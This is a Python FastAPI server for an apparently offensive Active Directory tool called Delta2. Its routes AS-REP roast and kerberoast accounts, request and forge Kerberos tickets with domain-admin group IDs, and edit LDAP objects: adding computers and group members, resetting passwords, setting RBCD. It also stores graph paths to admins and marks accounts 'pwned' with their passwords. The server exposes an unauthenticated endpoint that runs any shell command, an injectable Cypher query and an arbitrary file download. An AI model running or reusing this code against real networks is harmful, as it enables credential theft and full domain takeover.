import random
import string
import sys, os
from neo4j import GraphDatabase
import argparse
from delta2.colors import colors
import markdown
import markdown.extensions.fenced_code
from delta2.scripts.collector import Data_collection # Data collection
from delta2.scripts.utils.tickets import TGS_no_preauth # Kerberoast with no preauth and asrep roast
from fastapi import FastAPI, BackgroundTasks, UploadFile, HTTPException, Request
from pydantic import BaseModel
from typing import Optional, List
import uvicorn
from argparse import Namespace
from base64 import b64encode
from delta2.ascii import random_art



DEFAULT_QUERY = "MATCH (n) return n"

tags_metadata = [
        {"name": "kerberos",
        "description": "test or exploit kerberos authentication protocol."},
        {"name": "Memgraph",
        "description": "query memgraph database to find possible paths"},
        {"name": "config",
        "description": "configure delta2 and memgraph"},
        {
                "name": "ldap",
                "description": "routes for ldap"
        },
        {
                "name": "other",
                "description": "Other"
        }
]

from fastapi import Response
docs_file = "docs.md"
app = FastAPI(title="Delta2", openapi_tags=tags_metadata)
art = f"""
{colors.GREEN}                           ....iilll
{colors.GREEN}                 ....iilllllllllllll
{colors.RED}     ....iillll  {colors.GREEN}lllllllllllllllllll
{colors.RED} iillllllllllll  {colors.GREEN}lllllllllllllllllll
{colors.RED} llllllllllllll  {colors.GREEN}lllllllllllllllllll
{colors.RED} llllllllllllll  {colors.GREEN}lllllllllllllllllll
{colors.RED} llllllllllllll  {colors.GREEN}lllllllllllllllllll
{colors.RED} llllllllllllll  {colors.GREEN}lllllllllllllllllll
{colors.RED} llllllllllllll  {colors.GREEN}lllllllllllllllllll
 
{colors.BLUE} llllllllllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE} llllllllllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE} llllllllllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE} llllllllllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE} llllllllllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE} `^^^^^^lllllll  {colors.YELLOW}lllllllllllllllllll
{colors.BLUE}       ````^^^^  {colors.YELLOW}^^lllllllllllllllll
{colors.BLUE}                 {colors.YELLOW}     ````^^^^^^llll {colors.RESET}
"""
global name
global uri
name = None

class Dbconfig(BaseModel):
    name: str = "memgraph"
    uri: str = "bolt://localhost:7687"
class Query(BaseModel):
        query:str = DEFAULT_QUERY


class CMD(BaseModel):
        command: str

class Target(BaseModel):
        domain: str
        dc: str
        kerberos: str = "False"
        ldap_ssl: Optional[str] = "False"
        user_name: str = ""
        dc_ip: str = ""

class Kerberos(BaseModel):
        """
        Authentication class, can be used for other things than kerberos authentication.
        """
        password: str = ""
        user_hash: str = ":"
        aeskey: str = ""
        get_hash: str = "False"

class Roast(BaseModel):
        target_user: str
        no_preauth: Optional[str] = "False"



class editor(BaseModel):
        option: str= ""
        computer_name: str = ""
        computer_pass: str= ""
        target_obj: str= ""
        new_pass: str = ""
        oldpass: str = ""
        group: str = ""
        ou: str=""
        container: str=""
        service: str=""




client = "nothing"
def config_driver(DB_name, DB_uri):
        global client
        client = GraphDatabase.driver(uri=DB_uri, database=DB_name)
        return client

# app = Flask(__name__) # app variable for running flask
# #  test comment
# @app.route('/')
# def hello():
#         return render_template('index.html')
import json
from fastapi.responses import JSONResponse
import socket
@app.post("/config", tags=['config'])
async def config(conf:Dbconfig):
        """
        configure the database, 0 if database is configured properly, and will return error if otherwise
        """
        try:
                name = conf.name
                uri = conf.uri
                if name == None or name == "string":
                        name = "memgraph"
                if uri == None or uri == "string":
                        uri = "bolt://localhost:7687"
                print(name)
                print(uri)
                config_driver(DB_name=name, DB_uri=uri)
                records, summary, keys =  client.execute_query(DEFAULT_QUERY)
                data = "0"
        except Exception as e:
                try:
                        uri = f'bolt://{socket.gethostbyname(uri.replace("bolt://", ""))}'
                        print(uri)
                        config_driver(DB_name=name, DB_uri=uri)
                        records, summary, keys =  client.execute_query(DEFAULT_QUERY)
                        data = "0"
                except Exception as e:
                        None
                        print(e)
                        data = str(e)
        return data

import os, subprocess, time
@app.post("/cmd", tags=['config'])
def cmd(command: CMD):
        """ Help configure the container and execute remote commands """
        os.remove("cmd.log")
        command = command.command
        os.system(f'{command} > cmd.log')
        time.sleep(4)
        cmd_output = open('cmd.log', 'r').read()
        print(cmd_output)

        return Response(cmd_output)
        







@app.get("/", tags=['other'])
def ascii():
        """ Grab some cool ascii art """
        return Response(content=random_art(), media_type="text/plain")


from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import markdown
from markdown_it import MarkdownIt
md = MarkdownIt()

@app.get("/documentation", tags=['other'],response_class=HTMLResponse)
def documentation(request: Request):
        """ Get documentation read in firefox's "reader" """
        data = open("./api.md", 'r').read()
        html = md.render(data)
        return HTMLResponse(content=html)





""" Kerberos """

from delta2.scripts.utils import tickets
@app.post("/kerberos/asrep", tags=["kerberos"])
async def asreproast(target: Target, kerb: Kerberos):
        """
        Asrep roast users or get users that don't require preauth,
        json format goes as follows: `{"user": user, "asrep_data": hash, exception, or "Vulnerable"}`
        if get_hash is "True" it will return hash in `asrep_data` if the user is asrep roastable,
        if it is false then it will return "Vulnerable" in `asrep_data`,
        if the user is not vulnerable it will return an empty string in `asrep_data`,
        Only requires the target user `user_name`, DC `dc`, domain `domain`, specifying `dc_ip` is recommended.
        """
        domain = target.domain
        dc = target.dc
        user_name = target.user_name
        get_hash = kerb.get_hash
        dc_ip = target.dc_ip
        print(get_hash)
        e = "nil"
        tgt = tickets.TGT(domain=domain, dc=dc, username=user_name, dc_ip=dc_ip)
        try:
                h  = tgt.run(user_name)
        except Exception as a:
                e = a
                h = 'Nil'
        if e != "nil":

                data = {'user': user_name, "asrep_data": f'error occured: {str(e)}'}
        else:
                if get_hash == True or get_hash == "True":
                        data = {'user': user_name, "asrep_data": h}
                if get_hash == False or get_hash == "False":
                        data = {'user':user_name, "asrep_data": "Vulnerable"}

        return JSONResponse(data)



@app.post("/kerberos/kerbroast", tags=['kerberos'])
# target_user: str, no_preauth: str="True"
async def kerbroast(target: Target, kerb: Kerberos, roast: Roast):
        """
        kerberoast users, 
        also supports using a user that requires no preauthentication to kerberoast another user
        """
        domain = target.domain
        dc = target.dc
        target_user = roast.target_user
        no_preauth = roast.no_preauth
        # target_user = target_user
        # preauth = no_preauth
        user = target.user_name
        dc_ip = target.dc_ip
        password = kerb.password
        ntlm = kerb.user_hash
        get_hash = kerb.get_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        e =  "nil"
        aeskey = kerb.aeskey
        #print(get_hash)
        if no_preauth == "True":
                no_preauth = True
        else:
                no_preauth = False
        tgs = TGS_no_preauth(domain=domain, dc=dc, username=target_user, password=password, nthash=nt, lmhash=lm, aeskey=aeskey, no_preauth=no_preauth, dc_ip=dc_ip)
        try:
                h = tgs.run(nopreauth_user=user)
                print(h)
        except Exception as a:
                print(traceback.format_exc())
                print(a)
                e = a
        if e != "nil":

                data = {'user': target_user, "kerb_data": f'error: {str(e)}'}
        else:
                if get_hash == True or get_hash == "True":
                        data = {'user': target_user, "kerb_data": h}
                if get_hash == False or get_hash == "False":
                        data = {'user':target_user, "kerb_data": "Vulnerable"}

        return JSONResponse(data)
import traceback

@app.post("/kerberos/tgt", tags=["kerberos"])
def tgt(target: Target, kerb: Kerberos, roast: Roast):
        """
        Grab a TGT for a user, output is a base64 encoded ccache file data
        """
        domain = target.domain
        dc = target.dc
        no_preauth = roast.no_preauth
        user = target.user_name
        dc_ip = target.dc_ip
        password = kerb.password
        ntlm = kerb.user_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        e =  "nil"
        aeskey = kerb.aeskey
        if no_preauth == "True":
                no_preauth = True
        else:
                no_preauth = False
        tgt = tickets.GetTGT(domain=domain, username=user, dc=dc, dc_ip=dc_ip, password=password, nthash=nt, lmhash=lm, aeskey=aeskey, no_preauth=no_preauth)
        try:
                h = tgt.run()
        except Exception as a:
                print(traceback.format_exc())
                e = a
        if e != "nil":
                data = {"user": user, "tgt_data": f'error: {e}', 'file_name': tgt.f_name + '.ccache'}
                
        else:
                h = tgt.save(save=True)
                data = {"user": user, "tgt_data": h, 'file_name': tgt.f_name + '.ccache'}
        return data

@app.post('/kerberos/tgs', tags=['kerberos'])
def tgs(target: Target, kerb: Kerberos, roast: Roast):
        """ Grabs TGSs """
        domain = target.domain
        dc = target.dc
        user = target.user_name
        dc_ip = target.dc_ip
        password = kerb.password
        target_user = roast.target_user
        if target_user == "string" or target_user is None:
                target_user = user
        if roast.no_preauth == "True":
                no_preauth = True
        else:
                no_preauth = False
        ntlm = kerb.user_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        e =  "nil"
        aeskey = kerb.aeskey
        tgs = tickets.TGS(domain=domain, dc=dc, username=user, password=password, nthash=nt, lmhash=lm, aeskey=aeskey, no_preauth=no_preauth, dc_ip=dc_ip)
        try:
                h = tgs.run(target_user=target_user, save=True)
        except Exception as a:
                print(traceback.format_exc())
                e = a
        if e != "nil":
                data = {"user": target_user, "tgs_data": f'error: {e}', 'file_name': tgs.f_name  + '.ccache'}
                
        else:
                # h = tgs.save(save=False)
                data = {"user": target_user, "tgs_data": h , 'file_name': tgs.f_name + '.ccache'}
        return data



from delta2.scripts.utils.tickets import ST
from impacket.krb5.ccache import CCache
import base64
class ST_DATA(BaseModel):
        spn: str = ""
        u2u: str = ""
        no_s4u2proxy: str = ""


from impacket.krb5.kerberosv5 import getKerberosTGT, Principal, constants, unhexlify
@app.post("/kerberos/st", tags=['kerberos'])
def st(target: Target, kerb: Kerberos, roast: Roast, st_data: ST_DATA):
        """
        Grabs ST for a target user
        """
        domain = target.domain
        dc = target.dc
        user = target.user_name
        dc_ip = target.dc_ip
        password = kerb.password
        target_user = roast.target_user
        if target_user == "string" or target_user is None:
                target_user = user
        if roast.no_preauth == "True":
                no_preauth = True
        else:
                no_preauth = False
        ntlm = kerb.user_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        e =  "nil"
        a = None
        aeskey = kerb.aeskey
        if st_data.u2u == "":
                st_data.u2u = None
        if st_data.no_s4u2proxy == "":
                st_data.no_s4u2proxy = None
        try:
                userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName = userName,
                                                                password = password,
                                                                domain = domain,
                                                                lmhash = unhexlify(lm),
                                                                nthash = unhexlify(nt),
                                                                aesKey = aeskey,
                                                                kdcHost = dc_ip)
                st = ST(domain=domain, dc=dc, username=user, tgt=tgt, cipher=cipher, spn=st_data.spn, 
                        sessionKey=sessionKey, oldSessionKey=oldSessionKey, password=password, nthash=nt, 
                        lmhash=lm, aeskey=aeskey, dc_ip=dc_ip)
                try:
                        data = st.run(target_user=target_user, no_s4u2proxy=st_data.no_s4u2proxy, u2u=st_data.u2u)
                except Exception as a:
                        print(traceback.format_exc())
                        e = a
                        data = f'error: {str(a)}'
        except Exception as a:
                print(traceback.format_exc())
                e = a
                data = f'error: {str(a)}'
        return {"target": target_user, 'ST': data, 'file_name': st.f_name + '.ccache'}





class Get_file(BaseModel):
        file_name: str


from fastapi.responses import FileResponse
@app.post('/kerberos/download_ticket', tags=['kerberos'])
def download(get_file: Get_file):
        """ Download the ticket """
        return FileResponse(get_file.file_name)


from base64 import b64decode


class Tickets_editor(BaseModel):
        b64_encoded_ticket: str = ""
        spn: str = ""
        user_sid: str= ""
        target_user: str = ""
        groups: str = "513, 512, 520, 518, 519"
        user_id: str= "500"
        impersonate: str=""
        request_ticket: str="true"

from uuid import uuid4
from delta2.scripts.impacket_examples.ticker import TICKETER


class OPTIONS(argparse.Namespace):
        def __setattr__(self, name, value):
                if isinstance(value, str) and not value:
                        value = None
                super().__setattr__(name, value)




@app.post("/kerberos/ticket_editor", tags=['kerberos'])
def ticket_editor(tickets: Tickets_editor, target: Target, kerb: Kerberos):
        """ Ticket editor, takes in the base64 encoded ticket, most code was copied from impacket's ticketer.py """
        fname = f'{str(uuid4())}.ccache'
        tmp_file = open(fname, 'wb').write(b64decode(tickets.b64_encoded_ticket))
        os.system(f"export KRB5CCNAME='./{fname}'")
        target_user = tickets.target_user
        domain = target.domain
        dc = target.dc
        user = target.user_name
        dc_ip = target.dc_ip
        password = kerb.password
        ntlm = kerb.user_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]
        spn = tickets.spn
        groups = tickets.groups
        sid = tickets.user_sid
        target_id = tickets.user_id
        request_ticket = tickets.request_ticket
        if request_ticket == "true":
                request_ticket = True
        else:
                request_ticket = False


        options = OPTIONS(
    target=target_user,  # Set default values or leave them as None
    spn=spn,
    request=request_ticket,
    domain=domain,
    domain_sid=sid,
    aesKey=kerb.aeskey,
    nthash=nt,
    keytab=None,
    groups=groups,
    user_id=target_id,
    extra_sid=None,
    extra_pac=False,
    old_pac=False,
    duration='87600',
    ts=False,
    debug=False,
    user=user,
    password=password,
    hashes=ntlm,
    dc_ip=dc_ip,
    impersonate=tickets.impersonate
)
        tick = TICKETER(target=target_user, password=password, domain=domain, options=options)
        try:
                ticket_data = tick.run()
        except Exception as e:
                print(traceback.format_exc())
                ticket_data = str(e)
        return {'response': ticket_data}





from threading import Thread


""" Ldap Routes """
@app.post("/ldap/collect", tags=['ldap'])
async def collect(target: Target, kerb: Kerberos):
        """
        Collector class, will take a while to run if the dataset is large
        """
        domain = target.domain
        username = target.user_name
        password = kerb.password
        dc = target.dc
        dc_ip = target.dc_ip
        db_location = uri
        db_name = name
        ntlm = kerb.user_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]

        e =  "nil"
        aeskey = kerb.aeskey
        kerberos_auth = target.kerberos
        ldap_ssl = target.ldap_ssl
        if kerberos_auth == "False":
                kerberos_auth = None
        else:
                kerberos_auth = True
        if ldap_ssl == "False":
                ldap_ssl = False
        else:
                ldap_ssl = True
        try:
                collector = Data_collection(domain=domain, password=password, 
        user_name=username,dc=dc, lmhash=lm,nthash=nt, kerberos=kerberos_auth, 
        database_uri=uri,ldap_ssl=ldap_ssl, kdcHost=dc_ip, aeskey=aeskey, dc_ip=dc_ip)
                print("collecting users")
                collector.users()
                print("collecting groups..")
                collector.groups()
                print("collecting OUs")
                collector.OUs()
                print("connecting OUs")
                collector.connect_OUs()
                print("routing ACEs")
                collector.route_ACEs()
                print("Finding GMSAPassword abuse")
                collector.ReadGMSAPassword()
                print("routing others..")
                collector.route_others()
                return {"response": 0}
                
        except Exception as a:
                e = a
                print(traceback.format_exc())
                return {"response": str(e)}
        


from delta2.scripts.objeditor import Objeditor
@app.post("/ldap/objeditor", tags=['ldap'])
def editobj(target: Target, kerb: Kerberos, ops: editor):
        """ Object editor options are: add_computer, add_member, edit_pass, delete_group_member, delete, add_rbcd """
        domain = target.domain
        username = target.user_name
        password = kerb.password
        dc = target.dc
        dc_ip = target.dc_ip
        db_location = uri
        db_name = name
        ntlm = kerb.user_hash
        lm = ntlm.split(":")[0]
        nt = ntlm.split(":")[-1]

        e =  "nil"
        aeskey = kerb.aeskey
        kerberos_auth = target.kerberos
        ldap_ssl = target.ldap_ssl
        if kerberos_auth == "False":
                kerberos_auth = False
        else:
                kerberos_auth = True
        if ldap_ssl == "False":
                scheme = "ldap"
        else:
                scheme = "ldaps"
        
        objeditor = Objeditor(username=username, dc=dc, domain=domain, dc_ip=dc_ip, 
                        scheme=scheme, password=password, lmhash=lm, nthash=nt, 
                        kerberos=kerberos_auth, aeskey=aeskey)
        action = ops.option
        methods = [method for method in dir(objeditor) if callable(getattr(objeditor, method))]
        


        computer_name = ops.computer_name
        computer_pass = ops.computer_pass
        target_obj = ops.target_obj
        new_pass = ops.new_pass
        old_pass = ops.oldpass
        group = ops.group
        ou = ops.ou
        container = ops.container
        service = ops.service


        if action not in methods:
                return {"response": f"error: action '{action}' not in Objeditor class!"}
        try:
                if action == "add_computer":
                        data = objeditor.add_computer(computername=computer_name, computerpass=computer_pass, container=container, ou=ou)
                if action == "add_member":
                        data = objeditor.add_member(group=group, member=target_obj)
                if action == "edit_pass":
                        if old_pass == "":
                                old_pass = None
                        data = objeditor.edit_pass(target_user=target_obj, newpass=new_pass, oldpass=old_pass)
                if action == "delete_group_member":
                        data = objeditor.delete_group_member(member=target_obj, group=group)
                if action == "delete":
                        data = objeditor.delete(obj=target_obj)
                

                if action == "add_rbcd":
                        data = objeditor.add_rbcd(target=target_obj, service=service)



                return {"response": data}

        except Exception as a:
                print(traceback.format_exc())
                e = a
                return {"response": f"error: {e}"}


        
        




""" Memgraph querying """

@app.post("/graphing/query", tags=["Memgraph"])
async def query(q:Query):
        """
        returns json response from entering query 
        """
        query = q.query
        if query == None or query == "string":
                query = DEFAULT_QUERY
        records, summary, keys = client.execute_query(query)
        data = []
        for record in records:
                record = record.data()
                data.append(record)
        data = JSONResponse(data)
        return data

@app.get("/graphing/admin_paths", tags=["Memgraph"])
async def admin_paths():
        """
        grabs shortest paths to admins
        """
        query = """
MATCH path1=(n {t: "user"})-[ *ALLSHORTEST (r, n | 1)]->(m {adminCount: "1"}) WHERE m.disabled is null and n.disabled is null and n.pwned = "True"
MATCH path2=(a {t: "computer"})-[ *ALLSHORTEST (b, c | 1)]->(d {adminCount: "1"}) WHERE d.disabled is null and a.disabled is null
RETURN path1,path2
        """
        records, summary, keys = client.execute_query(query)
        data = []
        for record in records:
                record = record.data()
                data.append(record)
        data = JSONResponse(data)
        return data

@app.get("/graphing/kerberoastable", tags=['Memgraph'])
async def get_kerberoastable():
        """
        Grabs kerberoastable users and returns them as json with their attributes
        """
        query = """
        MATCH (n) WHERE n.kerberoastable = "True"
        RETURN n
        """
        records, summary, keys = client.execute_query(query)
        data = []
        for record in records:
                record = record.data()
                data.append(record)
        data = JSONResponse(data)
        return data


@app.get("/graphing/asreproastable", tags=["Memgraph"])
async def get_asreproastable():
        """
        Grabs asreproastable users and returns their attributes
        """
        query = """
        MATCH (n) WHERE n.asreproast = "True"
        RETURN n
        """
        records, summary, keys = client.execute_query(query)
        data = []
        for record in records:
                record = record.data()
                data.append(record)
        data = JSONResponse(data)
        return data

class Pwned(BaseModel):
        obj: str = ""
        password: str = ""



@app.post("/graphing/pwned", tags=['Memgraph'])
def mark_pwned(pwn: Pwned):
        """ Mark an object as pwned """
        obj = pwn.obj
        password = pwn.password
        query = f"""
        MATCH (a) WHERE a.name = '{obj}'
        set a.pwned = 'True'
        set a.password = '{password}'
        return a
        """
        records, summary, keys = client.execute_query(query)
        data = []
        for record in records:
                record = record.data()
                data.append(record)
        data = JSONResponse(data)
        return data







@app.get("/graphing/clear", tags=["Memgraph"])
async def clear_db():
        """
        clear memgraph DB
        """
        query = """
        MATCH(n)
        DETACH DELETE n;
        """
        records, summary, keys = client.execute_query(query)
        return {"response": 0}



if __name__ == '__main__':
        print(art)
        parser = argparse.ArgumentParser()
        parser.add_argument('-uri', help='memgraph host with port', type=str, default='bolt://localhost:7687',action="store")
        parser.add_argument('-db_name', help='memgraph db name', type=str, default='memgraph',action="store")
        options = parser.parse_args()

        name = options.db_name
        uri = options.uri
        host = '0.0.0.0'
        port = '9000'
        print(f'to configure graphing database location, go to: `http://{host}:{port}/config` if not specified in arguemnts or if you want to switch databases')
        client = config_driver(DB_name=name, DB_uri=uri)

        #app.run(host, port, debug=True)
        uvicorn.run(app, host=host, port=port)